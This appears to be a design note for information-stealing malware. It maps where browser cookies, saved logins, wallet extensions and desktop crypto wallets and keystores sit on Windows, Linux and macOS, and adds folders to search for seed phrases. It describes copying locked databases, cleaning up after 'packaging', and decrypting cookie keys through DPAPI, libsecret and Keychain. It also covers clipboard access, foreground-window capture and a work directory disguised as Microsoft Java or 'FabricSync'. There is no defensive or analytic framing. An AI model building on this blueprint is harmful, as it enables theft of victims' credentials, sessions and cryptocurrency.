# Path resolution per OS

All roots come from environment variables first, then the user home. Nothing is
hard-coded to a drive letter. Every target is existence-checked before it reaches
the manifest.

| Object | Windows | Linux | macOS |
|---|---|---|---|
| Chrome / Edge / Brave / Opera user data | `%LOCALAPPDATA%\Google\Chrome\User Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data`, `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data`, `%APPDATA%\Opera Software\Opera Stable` | `~/.config/google-chrome`, `~/.config/microsoft-edge`, `~/.config/BraveSoftware/Brave-Browser`, `~/.config/opera` | `~/Library/Application Support/Google/Chrome`, `.../Microsoft Edge`, `.../BraveSoftware/Brave-Browser`, `.../com.operasoftware.Opera` |
| Extension vault | `<profile>\Local Extension Settings\<id>` | `<profile>/Local Extension Settings/<id>` | `<profile>/Local Extension Settings/<id>` |
| Extension sync store | `<profile>\Sync Extension Settings\<id>` | `<profile>/Sync Extension Settings/<id>` | same |
| Extension IndexedDB | `<profile>\IndexedDB\chrome-extension_<id>_0.indexeddb.leveldb` | `<profile>/IndexedDB/...` | same |
| Chromium cookies | `<profile>\Cookies`, `<profile>\Network\Cookies` | `<profile>/Cookies`, `<profile>/Network/Cookies` | same |
| Chromium logins | `<profile>\Login Data` | `<profile>/Login Data` | same |
| Firefox profile | `%APPDATA%\Mozilla\Firefox\Profiles\*` | `~/.mozilla/firefox/*` | `~/Library/Application Support/Firefox/Profiles/*` |
| Exodus | `%APPDATA%\Exodus\exodus.wallet` | `~/.config/Exodus/exodus.wallet` | `~/Library/Application Support/Exodus/exodus.wallet` |
| Electrum / Electrum-LTC | `%APPDATA%\Electrum\wallets`, `%APPDATA%\Electrum-LTC\wallets` | `~/.electrum/wallets`, `~/.electrum-ltc/wallets` | `~/Library/Application Support/Electrum/wallets` |
| Atomic | `%APPDATA%\Atomic\Local Storage\leveldb` | `~/.config/Atomic/Local Storage/leveldb` | `~/Library/Application Support/Atomic/Local Storage/leveldb` |
| Trust desktop | `%APPDATA%\Trust Wallet\Local Storage\leveldb` | `~/.config/Trust Wallet/Local Storage/leveldb` | `~/Library/Application Support/Trust Wallet/Local Storage/leveldb` |
| Coinomi | `%APPDATA%\Coinomi\Coinomi\wallets` | `~/.config/Coinomi/Coinomi/wallets` | `~/Library/Application Support/Coinomi/Coinomi/wallets` |
| Ledger Live | `%APPDATA%\Ledger Live` | `~/.config/Ledger Live` | `~/Library/Application Support/Ledger Live` |
| Geth keystore | `%APPDATA%\Ethereum\keystore` | `~/.ethereum/keystore` | `~/Library/Application Support/Ethereum/keystore` |
| Parity keys | `%APPDATA%\Parity\Ethereum\keys` | `~/.local/share/io.parity.ethereum/keys` | `~/Library/Application Support/io.parity.ethereum/keys` |
| Bitcoin Core | `%APPDATA%\Bitcoin\wallets` | `~/.bitcoin/wallets` | `~/Library/Application Support/Bitcoin/wallets` |
| Monero | `%APPDATA%\Monero\wallets` | `~/.bitmonero` | `~/Library/Application Support/Monero/wallets` |
| Seed search roots | Desktop, Documents, Downloads, `%APPDATA%` | `~/Desktop`, `~/Documents`, `~/Downloads`, `~/.config` | `~/Desktop`, `~/Documents`, `~/Downloads`, `~/Library/Application Support` |
| Agent work dir | `%LOCALAPPDATA%\Microsoft\Java` | `~/.local/share/FabricSync` | `~/Library/Application Support/FabricSync` |

## Write order

1. Source `LOCK`/`LOG` skipped.
2. LevelDB/SQLite copied to `%TEMP%`-equivalent (`cache/crypto/tmp`) before any read.
3. Reads happen only on the copy.
4. Temp dirs are deleted after packaging, including on failure.
5. Every container path is normalized to forward slashes and capped at 900 chars.

## Platform gates

| Feature | Windows | Linux | macOS |
|---|---|---|---|
| DPAPI unwrap | yes (CryptUnprotectData via PowerShell) | no | no |
| App-bound encryption | machine + user DPAPI | no | no |
| Chrome cookie key | DPAPI | libsecret missing → `peanuts` | Keychain `security` |
| Clipboard | `Get-Clipboard`/`Set-Clipboard` | `wl-paste`/`xclip` | `pbpaste`/`pbcopy` |
| Foreground window | user32 P/Invoke | `xdotool` | `System Events` |
| Firefox NSS | yes | yes | yes |
